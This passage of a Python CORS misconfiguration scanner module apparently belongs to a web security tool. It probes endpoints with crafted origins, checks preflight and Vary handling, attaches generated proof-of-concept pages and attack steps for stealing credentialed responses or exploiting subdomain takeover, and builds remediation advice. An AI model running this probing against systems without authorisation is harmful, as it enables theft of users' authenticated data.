    Returns endpoint list from scan_results.
    Prioritises: API endpoints, auth endpoints, payment endpoints, admin.
    For CORS, /api/* and /graphql are the most valuable targets.
    """

    _API_PATH_HINTS: List[str] = [
        "/api/", "/graphql", "/v1/", "/v2/", "/rest/",
        "/json", "/data/", "/services/", "/gateway/",
        "/account", "/profile", "/user", "/me",
        "/payment", "/order", "/checkout",
        "/admin", "/internal",
    ]

    def discover(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
    ) -> List[str]:
        endpoints: Set[str] = set()

        # 1. payload_analysis injection points with API-ish paths
        for ip in scan_results.get("payload_analysis", {}).get("injection_points", []):
            url = ip.get("url", "")
            if not url:
                continue
            parsed = urlparse(url)
            if any(h in parsed.path for h in self._API_PATH_HINTS):
                endpoints.add(url)
            # Also add the base URL
            endpoints.add(f"{parsed.scheme}://{parsed.netloc}{parsed.path}")

        # 2. tech_detection base URLs
        base_seen: Set[str] = set()
        for t_url in scan_results.get("tech_detection", {}):
            parsed = urlparse(t_url)
            base   = f"{parsed.scheme}://{parsed.netloc}"
            if base not in base_seen:
                base_seen.add(base)
                for path in self._API_PATH_HINTS:
                    endpoints.add(base + path)
                # Also test the root
                endpoints.add(base + "/")

        # 3. subdomains
        for sub in scan_results.get("subdomains", []):
            if not (sub.get("http_status") or sub.get("https_status")):
                continue
            scheme = "https" if sub.get("https_status") else "http"
            hostname = sub["subdomain"]
            base = f"{scheme}://{hostname}"
            # API subdomains get path probing
            if any(kw in hostname for kw in
                   ("api", "graphql", "data", "gateway", "service")):
                for path in self._API_PATH_HINTS[:6]:
                    endpoints.add(base + path)
            else:
                endpoints.add(base + "/")

        # 4. OSINT exposed paths
        for pe in scan_results.get("osint_correlation", {}).get("exposed_paths", [])[:15]:
            ep_url = pe.get("url") or pe.get("path", "")
            if ep_url and ep_url.startswith("http"):
                endpoints.add(ep_url)

        return list(endpoints)[:50]
        
        
# ─────────────────────────────────────────────────────────────────────────────
# Vary header auditor — passive check on cached CORS responses
# ─────────────────────────────────────────────────────────────────────────────

class _VaryAuditor:
    """
    Checks whether CORS-enabled endpoints include 'Origin' in the Vary
    header.  Missing Vary: Origin on a CORS endpoint means intermediate
    caches (CDN, proxy) may serve one origin's response to another origin,
    leading to cache-poisoning cross-origin data leakage.
    """

    def audit(
        self,
        http: _HttpPool,
        url:  str,
        origin_a: str,
        origin_b: str,
    ) -> Optional[Tuple[FindingSeverity, str, Dict[str, Any]]]:
        result_a = http.get(url, origin_a)
        result_b = http.get(url, origin_b)
        if not result_a or not result_b:
            return None

        resp_a, cors_a = result_a
        resp_b, cors_b = result_b

        # Both responses must have CORS headers
        if not cors_a.any_cors or not cors_b.any_cors:
            return None

        # Check Vary header
        vary_a = (cors_a.vary or "").lower()
        vary_b = (cors_b.vary or "").lower()

        if "origin" not in vary_a and cors_a.any_cors:
            return (
                FindingSeverity.MEDIUM,
                "Missing Vary: Origin on CORS endpoint — "
                "CDN/proxy may cache ACAO from origin A and serve it to origin B",
                {
                    "vary_a":           cors_a.vary,
                    "vary_b":           cors_b.vary,
                    "acao_a":           cors_a.acao,
                    "acao_b":           cors_b.acao,
                    "cache_control_a":  resp_a.headers.get("Cache-Control"),
                    "cache_control_b":  resp_b.headers.get("Cache-Control"),
                },
            )
        return None


# ─────────────────────────────────────────────────────────────────────────────
# Scorer and recommendation builder
# ─────────────────────────────────────────────────────────────────────────────

class _Scorer:
    _W = {
        FindingStatus.CONFIRMED: 1.0,
        FindingStatus.LIKELY:    0.65,
        FindingStatus.POSSIBLE:  0.4,
        FindingStatus.NOT_VULN:  0.0,
    }

    def score(self, findings: List[CorsFinding]) -> Tuple[float, str]:
        if not findings:
            return 0.0, "INFO"
        raw = sum(f.severity.value * self._W.get(f.status, 0.5) for f in findings)
        cap = len(findings) * FindingSeverity.CRITICAL.value
        s   = min(100.0, (raw / cap) * 100) if cap else 0.0
        label = (
            "CRITICAL" if s >= 80 else
            "HIGH"     if s >= 60 else
            "MEDIUM"   if s >= 40 else
            "LOW"      if s >= 20 else
            "INFO"
        )
        return round(s, 2), label


class _RecBuilder:
    _RECS: Dict[CorsVariant, str] = {
        CorsVariant.REFLECT_ARBITRARY_ORIGIN:
            "Never reflect the Origin header back as ACAO. "
            "Maintain an explicit server-side allowlist; reject unknown origins.",
        CorsVariant.REFLECT_NULL_ORIGIN:
            "Remove null from allowed origins. "
            "Any sandboxed iframe or data: URI context can send Origin: null.",
        CorsVariant.REFLECT_REGEX_ESCAPE:
            "Do not build allowlist from regexes that contain unescaped dots. "
            "Use exact string comparison or canonicalise origins first.",
        CorsVariant.REFLECT_PREFIX_MATCH:
            "Avoid prefix/suffix substring matching for origin validation. "
            "Match the full origin string exactly, including scheme and port.",
        CorsVariant.REFLECT_SUFFIX_MATCH:
            "Suffix matching (endsWith) allows attacker.example.com to match example.com. "
            "Always match the full origin string exactly.",
        CorsVariant.REFLECT_DOT_ESCAPE:
            "Escape literal dots in origin regex (\\\\. not .). "
            "Prefer exact allowlist lookup over regex.",
        CorsVariant.REFLECT_CASE_INSENSITIVE:
            "Normalise origin to lowercase before comparison. "
            "HTTP origins are case-insensitive per RFC 6454.",
        CorsVariant.TRUST_SUBDOMAIN_TAKEOVER:
            "CRITICAL CHAIN: revoke subdomain trust from CORS allowlist AND "
            "claim or remove the takeover-vulnerable subdomain immediately.",
        CorsVariant.TRUST_SUBDOMAIN_XSS:
            "XSS on a trusted subdomain is equivalent to XSS on the main domain. "
            "Fix XSS on all trusted subdomains; apply CSP everywhere.",
        CorsVariant.TRUST_HTTP_DOWNGRADE:
            "Remove http:// origins from CORS allowlist. "
            "Only trust https:// origins; enforce HSTS.",
        CorsVariant.TRUST_DEVELOPER_ORIGIN:
            "Remove localhost/staging/dev origins from production CORS config. "
            "Use separate configs per environment.",
        CorsVariant.TRUST_THIRD_PARTY_ORIGIN:
            "Never whitelist third-party CDN origins in CORS. "
            "A CDN compromise gives full credentialed access to your API.",
        CorsVariant.BYPASS_TRAILING_DOT:
            "Strip trailing dot from origin before allowlist comparison (FQDN normalisation).",
        CorsVariant.BYPASS_PORT_VARIATION:
            "Include port in allowlist comparison. "
            "example.com:8080 and example.com are different origins.",
        CorsVariant.BYPASS_UNICODE_DOMAIN:
            "Normalise origin to Punycode (ASCII) before comparison. "
            "Reject Unicode hostnames.",
        CorsVariant.PREFLIGHT_WILDCARD_METHODS:
            "Restrict ACAM to only the HTTP methods your API actually uses. "
            "Never return a wildcard ACAM.",
        CorsVariant.PREFLIGHT_WILDCARD_HEADERS:
            "Restrict ACAH to only the headers your API needs. "
            "Wildcard ACAH (*) exposes all custom headers.",
        CorsVariant.PREFLIGHT_CREDENTIALS_REFLECT:
            "Never return ACAC: true in preflight unless the origin is on a "
            "strict allowlist. Credentials in preflight expand the attack surface.",
        CorsVariant.PREFLIGHT_INJECTION:
            "Sanitise ACRH before reflecting it. Strip CRLF sequences.",
        CorsVariant.CREDENTIALS_ARBITRARY:
            "CRITICAL: ACAC: true with dynamic origin reflection allows full "
            "credentialed cross-origin read. Fix immediately: use strict allowlist.",
    }

    def build(self, findings: List[CorsFinding]) -> List[str]:
        seen:  Set[CorsVariant] = set()
        recs:  List[str] = []
        for f in sorted(findings, key=lambda x: (-x.severity.value,
                                                   x.status != FindingStatus.CONFIRMED)):
            if f.variant not in seen:
                seen.add(f.variant)
                recs.append(
                    f"[{f.severity.name}][{f.variant.value}] "
                    f"{self._RECS.get(f.variant, 'Restrict CORS to explicit origin allowlist.')}"
                )
        # Always append global guidance
        recs.append(
            "[ARCH] Always include Vary: Origin in CORS responses. "
            "Set ACAO per-request dynamically only after allowlist validation. "
            "Combine with CSRF tokens for state-changing endpoints."
        )
        return recs


# ─────────────────────────────────────────────────────────────────────────────
# Probe executor — ties everything together per endpoint
# ─────────────────────────────────────────────────────────────────────────────

class _ProbeExecutor:

    def __init__(
        self,
        http:        _HttpPool,
        evaluator:   _ResponseEvaluator,
        preflight:   _PreflightAnalyser,
        poc_gen:     _PocGenerator,
        vary_audit:  _VaryAuditor,
        trust_chain: _TrustChainAnalyser,
        origin_gen:  _OriginGenerator,
    ):
        self._http        = http
        self._eval        = evaluator
        self._preflight   = preflight
        self._poc         = poc_gen
        self._vary        = vary_audit
        self._trust_chain = trust_chain
        self._origin_gen  = origin_gen

    def probe(
        self,
        url:          str,
        subdomains:   List[str],
        scan_results: Dict[str, Any],
    ) -> List[CorsFinding]:
        findings:         List[CorsFinding] = []
        trusted_origins:  List[str]         = []

        # Generate origin probe set
        probes = self._origin_gen.generate(url, subdomains)

        # ── Origin reflection probes ──────────────────────────────────────────
        for origin, variant, desc in probes:
            result = self._http.get(url, origin)
            if not result:
                continue
            resp, cors = result

            eval_result = self._eval.evaluate(origin, cors, variant, resp.text or "")
            if not eval_result:
                continue

            severity, status, notes = eval_result

            # Track trusted origins for trust-chain analysis
            if cors.reflects_origin and cors.acao == origin:
                trusted_origins.append(origin)

            # Classify variant more precisely if credentials present
            if cors.credentials_true:
                if origin == "null":
                    variant = CorsVariant.CREDENTIALS_NULL
                elif cors.acao == origin and "attacker" in origin.lower():
                    variant = CorsVariant.CREDENTIALS_ARBITRARY
                elif any(sub in origin for sub in subdomains):
                    variant = CorsVariant.CREDENTIALS_SUBDOMAIN

            poc = self._poc.choose_poc(variant, url, origin)

            findings.append(CorsFinding(
                finding_id   = str(uuid.uuid4()),
                variant      = variant,
                severity     = severity,
                status       = status,
                target_url   = url,
                origin_sent  = origin,
                cors_headers = cors,
                evidence     = {
                    "origin_sent":      origin,
                    "acao":             cors.acao,
                    "acac":             cors.acac,
                    "reflects_origin":  cors.reflects_origin,
                    "credentials":      cors.credentials_true,
                    "vary":             cors.vary,
                    "description":      desc,
                },
                poc_html     = poc,
                attack_steps = self._build_steps(variant, url, origin, cors),
                exploitation = {
                    "poc_host":        f"Host PoC at {origin}",
                    "action":          "Victim visits PoC page — attacker receives response body",
                    "data_accessible": "All response data for authenticated victim",
                    "credentials":     cors.credentials_true,
                },
                notes = notes,
            ))

        # ── Preflight analysis ────────────────────────────────────────────────
        if probes:
            first_origin = probes[0][0]
            preflight_results = self._preflight.analyse(self._http, url, first_origin)
            for pv, ps, pst, pcors, pnotes in preflight_results:
                poc = self._poc.preflight_bypass(url, first_origin)
                findings.append(CorsFinding(
                    finding_id   = str(uuid.uuid4()),
                    variant      = pv,
                    severity     = ps,
                    status       = pst,
                    target_url   = url,
                    origin_sent  = first_origin,
                    cors_headers = pcors,
                    evidence     = {
                        "preflight":   True,
                        "acam":        pcors.acam,
                        "acah":        pcors.acah,
                        "credentials": pcors.credentials_true,
                    },
                    poc_html     = poc,
                    attack_steps = [
                        f"OPTIONS preflight to {url} with Origin: {first_origin}",
                        f"Server responds with: {pnotes}",
                        "Browser proceeds with actual request using this grant",
                    ],
                    exploitation = {"note": pnotes},
                    notes        = pnotes,
                ))

        # ── Trust-chain analysis ───────────────────────────────────────────────
        if trusted_origins:
            trust_findings = self._trust_chain.analyse(
                trusted_origins, scan_results, url
            )
            for tv, tsev, torigin, tchain in trust_findings:
                # Only add if not already a finding for this origin
                already = any(
                    f.target_url == url and f.origin_sent == torigin
                    and f.variant == tv
                    for f in findings
                )
                if not already:
                    poc = self._poc.credentialed_read(url, torigin)
                    findings.append(CorsFinding(
                        finding_id   = str(uuid.uuid4()),
                        variant      = tv,
                        severity     = tsev,
                        status       = FindingStatus.CONFIRMED,
                        target_url   = url,
                        origin_sent  = torigin,
                        cors_headers = CorsHeaders(
                            acao=torigin, acac=None, acam=None, acah=None,
                            acma=None, aceh=None, vary=None, raw={},
                        ),
                        evidence     = {"trust_chain": tchain, "origin": torigin},
                        poc_html     = poc,
                        attack_steps = [tchain],
                        exploitation = {
                            "chain_description": tchain,
                            "severity":          "CRITICAL CHAIN",
                        },
                        notes = tchain,
                    ))

        # ── Vary header audit ──────────────────────────────────────────────────
        if probes and len(probes) >= 2:
            vary_result = self._vary.audit(
                self._http, url,
                origin_a=probes[0][0],
                origin_b=probes[1][0],
            )
            if vary_result:
                vsev, vnotes, vevidence = vary_result
                findings.append(CorsFinding(
                    finding_id   = str(uuid.uuid4()),
                    variant      = CorsVariant.REFLECT_ARBITRARY_ORIGIN,
                    severity     = vsev,
                    status       = FindingStatus.CONFIRMED,
                    target_url   = url,
                    origin_sent  = probes[0][0],
                    cors_headers = CorsHeaders(
                        acao=None, acac=None, acam=None, acah=None,
                        acma=None, aceh=None, vary=vevidence.get("vary_a"),
                        raw={},
                    ),
                    evidence     = {**vevidence, "type": "missing_vary_origin"},
                    poc_html     = "",
                    attack_steps = [
                        "CORS endpoint missing Vary: Origin",
                        "CDN or reverse proxy caches ACAO for origin A",
                        "Subsequent request from origin B receives cached ACAO for origin A",
                        "Cache-poisoning cross-origin data leakage",
                    ],
                    exploitation = {"note": "Cache poisoning — no JavaScript required"},
                    notes        = vnotes,
                ))

        return findings

    @staticmethod
    def _build_steps(
        variant:    CorsVariant,
        url:        str,
        origin:     str,
        cors:       CorsHeaders,
    ) -> List[str]:
        steps = [
            f"Send request to {url} with Origin: {origin}",
            f"Server responds with ACAO: {cors.acao or 'N/A'} ACAC: {cors.acac or 'N/A'}",
        ]
        if cors.credentials_true:
            steps.append(
                "Credentials=true: browser will include session cookies "
                "and Authorization header in cross-origin request"
            )
            steps.append(
                "Host attacker page at the reflected origin, lure victim, "
                "receive their authenticated API response"
            )
        else:
            steps.append("No credentials — read public or semi-public response body")
        if variant == CorsVariant.TRUST_SUBDOMAIN_TAKEOVER:
            steps.append("Step 1: claim takeover-vulnerable subdomain")
            steps.append("Step 2: host PoC at claimed subdomain — trusted by CORS")
            steps.append("Step 3: lure victim — steal credentialed responses")
        return steps


# ─────────────────────────────────────────────────────────────────────────────
# Public API
# ─────────────────────────────────────────────────────────────────────────────

class CorsTester:
    """
    Drop-in ARTEX module.

    Usage in app.py (run_scan), after header_analysis + tech_detection:

        from core.cors_tester import CorsTester

        ct = CorsTester()
        scan_results[scan_id]['cors_tester'] = ct.run(
            domain=domain,
            scan_results=scan_results[scan_id],
        )
    """

    def __init__(
        self,
        timeout:    float = 9.0,
        delay:      float = 0.3,
        on_finding: Optional[Callable[[CorsFinding], None]] = None,
    ):
        self._timeout    = timeout
        self._delay      = delay
        self._on_finding = on_finding

    def run(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
    ) -> Dict[str, Any]:
        run_id     = str(uuid.uuid4())
        started_at = datetime.now()
        logger.info("CorsTester %s starting for %s", run_id, domain)

        http         = _HttpPool(timeout=self._timeout, delay=self._delay)
        evaluator    = _ResponseEvaluator()
        preflight    = _PreflightAnalyser()
        poc_gen      = _PocGenerator()
        vary_audit   = _VaryAuditor()
        trust_chain  = _TrustChainAnalyser()
        origin_gen   = _OriginGenerator()
        discoverer   = _EndpointDiscoverer()
        scorer       = _Scorer()

        # Collect subdomains
        subdomains: List[str] = [
            sub["subdomain"]
            for sub in scan_results.get("subdomains", [])
            if sub.get("http_status") or sub.get("https_status")
        ]

        endpoints = discoverer.discover(domain, scan_results)
        logger.info("CORS endpoints: %d  subdomains: %d",
                    len(endpoints), len(subdomains))

        executor = _ProbeExecutor(
            http, evaluator, preflight, poc_gen,
            vary_audit, trust_chain, origin_gen,
        )

        all_findings: List[CorsFinding] = []
        lock         = threading.Lock()

        def probe_one(url: str) -> None:
            try:
                results = executor.probe(url, subdomains, scan_results)
            except Exception as exc:
                logger.debug("CORS probe %s failed: %s", url, exc)
                results = []
            with lock:
                all_findings.extend(results)
                if self._on_finding:
                    for f in results:
                        try:
                            self._on_finding(f)
                        except Exception:
                            pass

        threads = [threading.Thread(target=probe_one, args=(url,))
                   for url in endpoints]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        # Dedup: same (target_url, origin_sent, variant) → keep highest severity
        deduped: Dict[Tuple[str, str, str], CorsFinding] = {}
        for f in all_findings:
            key = (f.target_url, f.origin_sent, f.variant.value)
            if key not in deduped or f.severity.value > deduped[key].severity.value:
                deduped[key] = f

        final = sorted(
            deduped.values(),
            key=lambda f: (-f.severity.value, f.status != FindingStatus.CONFIRMED),
        )

        credentialed_leaks = sum(
            1 for f in final
            if f.cors_headers.credentials_true
            and f.status in (FindingStatus.CONFIRMED, FindingStatus.LIKELY)
        )
        pocs_generated = sum(1 for f in final if f.poc_html)

        score, risk_level = scorer.score(final)
        recs   = _RecBuilder().build(final)

        finished_at = datetime.now()
        result = CorsTestResult(
            run_id              = run_id,
            domain              = domain,
            endpoints_tested    = len(endpoints),
            findings            = [f.to_dict() for f in final],
            credentialed_leaks  = credentialed_leaks,
            pocs_generated      = pocs_generated,
            score               = score,
            risk_level          = risk_level,
            techniques_tested   = sorted({f.variant.value for f in final}),
            recommendations     = recs,
            started_at          = started_at,
            finished_at         = finished_at,
        )

        logger.info(
            "CorsTester %s done — score=%.1f risk=%s findings=%d "
            "credentialed=%d pocs=%d",
            run_id, score, risk_level, len(final),
            credentialed_leaks, pocs_generated,
        )
        return result.to_dict()